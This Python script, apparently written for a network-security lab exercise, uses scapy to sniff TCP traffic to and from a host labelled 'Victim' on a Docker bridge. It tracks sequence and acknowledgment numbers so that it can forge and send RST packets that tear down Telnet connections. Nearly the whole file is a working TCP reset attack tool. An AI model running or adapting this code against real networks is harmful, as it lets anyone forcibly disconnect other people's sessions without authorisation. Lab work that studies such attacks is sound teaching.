from scapy.all import *

class host:
    def __init__(self, ip, name=None):
        self.ip = ip
        self.name = name if name else ip

    def __eq__(self, other):
        return self.ip == other.ip

class sniffer:
    def __init__(
            self, 
            iface: str, 
            filter_: str, 
            hosts=[], 
            print_history: bool=False, 
            do_rst_attack: bool=False
        ):
        self.iface = iface
        self.filter = filter_
        self.hosts = hosts
        self.tcp_history = {}
        self.print_history = print_history
        self.do_rst_attack = do_rst_attack

        self.number_of_packets = 0

    def print_pkt(self, pkt):
        tcp = pkt[TCP]
        ip = pkt.payload

        if tcp.flags & 0x04 and self.do_rst_attack:  # RST flag
            return

        seq = tcp.seq
        ack = tcp.ack
        payload_len = len(tcp.payload)

        # Format source and destination for display
        src_host = next((h for h in self.hosts if h.ip == ip.src), None)
        dst_host = next((h for h in self.hosts if h.ip == ip.dst), None)
        src_display = src_host.name if src_host else f"{ip.src}:{tcp.sport}"
        dst_display = dst_host.name if dst_host else f"{ip.dst}:{tcp.dport}"
        print(f"\n[#{self.number_of_packets}]Packet: {src_display} → {dst_display}")
        print(f"{ip.src}:{tcp.sport} → {ip.dst}:{tcp.dport}")
        print(f"SEQ: {seq}, ACK: {ack}, Payload length: {payload_len}")
        if tcp.payload:
            print(f"\tPayload: {bytes(tcp.payload)[:20].decode(errors='replace')}{'...' if len(tcp.payload) > 20 else ''}")

    def process_packet(self, pkt):
        if not pkt.haslayer(TCP):
            return

        if pkt[TCP].flags & 0x04 and self.do_rst_attack:  # RST flag
            return

        self.number_of_packets += 1

        tcp = pkt[TCP]
        ip = pkt.payload

        flow_key = (ip.src, tcp.sport, ip.dst, tcp.dport)
        reverse_key = (ip.dst, tcp.dport, ip.src, tcp.sport)

        seq = tcp.seq
        ack = tcp.ack
        payload_len = len(tcp.payload)

        # next_seq = self.calculate_next_seq(tcp, payload_len)
        # next_ack = self.calculate_next_ack(tcp, reverse_key)

        if self.print_history:
            self.print_pkt(pkt)

        if self.do_rst_attack and (tcp.sport == 23 or tcp.dport == 23):
            # print("Attempting RST attack...")
            self.rst_attack(pkt, flow_key, reverse_key)

        # Store history
        self.tcp_history[flow_key] = {
            "last_seq": seq,
            "last_ack": ack,
            "last_payload_len": payload_len
        }

    def rst_attack(self, pkt, flow_key, reverse_key):
        def calculate_next_seq(pkt):
            tcp = pkt[TCP]
            payload_len = len(tcp.payload)

            next_seq = tcp.seq + payload_len
            if tcp.flags & 0x02:  # SYN flag
                next_seq += 1
            if tcp.flags & 0x01:  # FIN flag
                next_seq += 1
            return next_seq

        def calculate_next_ack(pkt, reverse_key):
            tcp = pkt[TCP]

            if reverse_key in self.tcp_history:
                last_peer_seq = self.tcp_history[reverse_key]["last_seq"]
                last_peer_payload = self.tcp_history[reverse_key]["last_payload_len"]

                if last_peer_seq is not None:
                    next_ack = last_peer_seq + last_peer_payload
                    if tcp.flags & 0x02:
                        next_ack += 1
                    if tcp.flags & 0x01:
                        next_ack += 1
            else:
                next_ack = None

            return next_ack
        

        seq = calculate_next_seq(pkt)
        ack = calculate_next_ack(pkt, reverse_key)
        if ack is None:
            print("No ACK, cannot send RST")
            return

        ip = IP(src=flow_key[0], dst=flow_key[2])
        tcp = TCP(sport=flow_key[1], dport=flow_key[3], flags="R", seq=seq, ack=ack)
        pkt = ip/tcp
        send(pkt, verbose=0)
        

        # # send RST in the reverse direction as well
        # ip = IP(src=reverse_key[0], dst=reverse_key[2])
        # tcp = TCP(sport=reverse_key[1], dport=reverse_key[3], flags="R", seq=seq, ack=ack)
        # pkt = ip/tcp
        # send(pkt, verbose=0)

    def run(self):
        sniff(
            iface=self.iface,
            filter=self.filter,
            prn=self.process_packet
        )


if __name__ == "__main__":
    hosts = [
        host("10.9.0.5", name="🟨 Victim (client)"),
        host("10.9.0.6", name="🟦 User1 (server)")
    ]

    sniffer = sniffer(
        iface='br-ebe32bd8d831',
        filter_='tcp and (src host 10.9.0.5 or dst host 10.9.0.5)',
        hosts=hosts,
        print_history=True,
        do_rst_attack=True
    )
    sniffer.run()


